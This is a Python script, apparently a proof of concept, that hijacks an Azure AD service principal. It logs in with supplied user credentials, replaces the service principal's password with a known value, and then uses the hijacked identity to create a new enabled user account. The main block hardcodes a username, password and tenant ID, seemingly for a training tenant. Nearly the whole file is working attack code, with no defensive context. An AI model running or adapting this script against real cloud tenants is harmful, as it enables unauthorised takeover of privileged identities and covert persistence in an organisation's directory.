import uuid
import logging
from datetime import timedelta, datetime, timezone

from azure.common.credentials import ServicePrincipalCredentials, UserPassCredentials
from azure.graphrbac import GraphRbacManagementClient
from azure.graphrbac.models import PasswordCredential, UserCreateParameters, PasswordProfile

logging.basicConfig(level=logging.INFO)

def hijack(username, password, tenant_id, service_principal_id):

    domain = username.split('@')[1]

    # Step 0 - authenticate
    logging.info('Authenticating to Azure with the provided credentials')

    graphrbac_credentials = UserPassCredentials(username, password,
                                                resource='https://graph.windows.net')

    client = GraphRbacManagementClient(graphrbac_credentials, tenant_id=tenant_id)

    # Step 1 - get the desired service principal
    logging.info('Looking for the desired service principal')

    found = False
    for s in list(client.service_principals.list()):
        if s.app_id == service_principal_id:
            logging.info('Found it - hijacking {} ({})'.format(s.app_display_name, s.app_id))
            found = True
            break

    if not found:
        logging.error('Did not find service principal, exiting')
        return

    service_principal = client.service_principals.get(object_id=s.object_id)

    # Step 2 - create new credentials for the service principal
    logging.info('Creating new credentials for {}'.format(s.app_display_name))

    sp_password = 'Password123!'
    new_password = PasswordCredential(value=sp_password,
                                      start_date=(datetime.today() - timedelta(days=1)),
                                      end_date=(datetime.today() + timedelta(days=365)))
    client.service_principals.update_password_credentials(object_id=service_principal.object_id,
                                                          value=[new_password])
    logging.info('Set password \"{}\"'.format(sp_password))

    hijacked_credentials = ServicePrincipalCredentials(
        client_id=s.app_id,
        secret=new_password.value,
        tenant=tenant_id,
        resource='https://graph.windows.net'
    )

    # Step 3 - create a new user with the hijacked service principal credentials
    logging.info('Using hijacked service principal to create a new user')

    client = GraphRbacManagementClient(hijacked_credentials, tenant_id=tenant_id)

    random_uuid = uuid.uuid4()
    user_name = 'test-{}'.format(random_uuid)
    user_password = 'password123!'
    new_user_password = PasswordProfile(password=user_password)

    logging.info('Creating user {} with password \"{}\"'.format(user_name, user_password))
    new_user_parameters = UserCreateParameters(
        account_enabled=True,
        display_name=user_name,
        user_principal_name='{}@{}'.format(random_uuid, domain),
        mail_nickname=user_name,
        password_profile=new_user_password
    )

    new_user_created = client.users.create(new_user_parameters)

    logging.info('Done')


if __name__ == "__main__":

    logging.info('Launching script')

    hijack(username='velma.vanderduck@scctraining332.onmicrosoft.com',
           password='SecurePassword9182',
           tenant_id='c00e6140-0cd4-4f08-98af-c11c9a22de1d',
           service_principal_id='00000003-0000-0ff1-ce00-000000000000')